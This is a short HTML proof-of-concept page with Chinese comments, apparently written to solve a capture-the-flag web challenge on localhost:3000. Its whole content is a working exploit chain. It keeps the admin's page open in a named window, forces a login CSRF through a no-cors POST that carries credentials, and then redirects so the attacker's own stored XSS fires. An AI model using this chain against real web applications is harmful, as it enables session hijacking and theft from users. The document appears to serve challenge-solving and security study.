<!doctype html>
<meta charset="utf-8">
<title>poc</title>
<script>
const USER = 'aaaabbbb';
const PASS = 'aaaabbbbcc';
const LOCAL = 'http://localhost:3000';

// 第一步：先把 admin 的主页留在命名窗口里
window.open(`${LOCAL}/`, 'flagwin');

// 第二步：把当前会话切成你的账号
setTimeout(async () => {
  try {
    await fetch(`${LOCAL}/api/auth/login`, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: {
        'Content-Type': 'text/plain'
      },
      body: JSON.stringify({
        username: USER,
        password: PASS
      })
    });
  } catch (e) {}

  // 第三步：当前页跳到你的主页，触发你自己的 stored XSS
  setTimeout(() => {
    location = `${LOCAL}/`;
  }, 1200);
}, 1500);
</script>
